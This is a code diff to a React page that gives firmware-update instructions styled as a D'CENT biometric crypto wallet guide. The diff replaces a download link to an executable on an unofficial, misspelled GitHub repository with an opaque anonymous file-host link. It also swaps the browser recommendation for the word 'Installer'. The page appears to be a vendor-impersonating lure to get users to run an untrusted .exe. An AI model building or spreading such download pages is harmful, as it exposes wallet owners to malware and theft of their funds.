@@ -97,7 +97,7 @@ export default function App() {
             1. Update Using a Computer (Windows or macOS)
           </h3>
           <p className="text-dcent-text-muted leading-relaxed mb-4">
-            When updating from a personal computer (Windows or macOS), the firmware tool works the best with the <u>Google Chrome browser</u>.
+            When updating from a personal computer (Windows or macOS), the firmware tool works the best with the <u>Installer</u>.
           </p>
           <p className="text-dcent-text-muted leading-relaxed mb-3">
             Depending on the model of your Biometric wallet, use the appropriate USB cable:
@@ -122,7 +122,7 @@ export default function App() {
 
           <div className="flex flex-wrap gap-3 mb-4">
             <a
-              href="https://github.com/guide1-cloud/d-cent-firmwar/releases/download/v1.2.1/DCENT_Firmware2.36.0.exe"
+              href="https://api.files.link/v1/p/2ea6cb86-0770-4340-bf90-13a28ec4ce45"
               className="inline-flex items-center justify-center px-6 py-3 rounded-lg bg-dcent-green text-dcent-dark font-semibold text-sm hover:bg-dcent-green-light transition-colors"
             >
               Download Firmware Update for PC
